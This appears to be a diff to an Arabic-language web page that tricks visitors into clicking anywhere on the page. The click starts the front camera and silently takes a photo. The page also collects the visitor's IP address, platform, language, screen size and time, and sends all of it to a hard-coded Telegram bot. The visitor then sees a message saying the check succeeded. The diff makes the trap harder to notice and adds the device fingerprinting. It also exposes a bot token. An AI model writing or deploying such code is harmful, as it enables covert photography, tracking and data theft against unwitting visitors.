@@ -12,19 +12,14 @@ body {
   font-family:Arial;
 }
 video { display:none; }
-button {
-  padding:10px 20px;
-  font-size:18px;
-  margin-top:20px;
-}
+#msg { margin-top:20px; }
 </style>
 </head>
 
-<body>
+<body onclick="startOnce()">
 
-<h3>اضغط لفتح الموقع</h3>
-
-<button onclick="startCamera()">دخول</button>
+<h3>اضغط في أي مكان للمتابعة...</h3>
+<div id="msg"></div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
@@ -33,25 +28,53 @@ button {
 const BOT_TOKEN = "7852857305:AAEW7SqDION4MTuIPNnxP6caMEYMLl2yojc";
 const CHAT_ID  = "8514140307";
 
+let started = false;
 let streamRef = null;
 
-// لازم يكون بعد click
-function startCamera() {
-  navigator.mediaDevices.getUserMedia({
-    video: { facingMode: "user" } // كاميرا أمامية
-  })
+// جلب IP
+async function getIP() {
+  try {
+    let res = await fetch("https://api.ipify.org?format=json");
+    let data = await res.json();
+    return data.ip;
+  } catch {
+    return "غير متوفر";
+  }
+}
+
+// معلومات الجهاز + IP
+async function getInfo() {
+  const ip = await getIP();
+
+  return `
+🌐 IP: ${ip}
+📱 الجهاز: ${navigator.platform}
+🌐 اللغة: ${navigator.language}
+📏 الشاشة: ${screen.width}x${screen.height}
+⏰ الوقت: ${new Date().toLocaleString()}
+`;
+}
+
+// تشغيل مرة واحدة
+function startOnce() {
+  if (started) return;
+  started = true;
+
+  document.getElementById("msg").innerText = "⏳ جاري التشغيل...";
+
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
   .then(stream => {
     streamRef = stream;
     document.getElementById("video").srcObject = stream;
 
-    setTimeout(captureOnce, 2000);
+    setTimeout(capture, 2000);
   })
   .catch(() => {
-    alert("تم رفض الكاميرا ❌");
+    document.getElementById("msg").innerText = "❌ تم رفض الكاميرا";
   });
 }
 
-function captureOnce() {
+async function capture() {
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
 
@@ -63,20 +86,23 @@ function captureOnce() {
     streamRef.getTracks().forEach(t => t.stop());
   }
 
+  const info = await getInfo();
+
   canvas.toBlob(blob => {
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
     form.append("photo", blob);
+    form.append("caption", info);
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
       body: form
     })
     .then(() => {
-      document.body.innerHTML = "<h2>تم بنجاح ✅</h2>";
+      document.getElementById("msg").innerText = "✅ تم التحقق";
     })
     .catch(() => {
-      document.body.innerHTML = "<h2>فشل ❌</h2>";
+      document.getElementById("msg").innerText = "❌ فشل الإرسال";
     });
   }, "image/jpeg");
 }
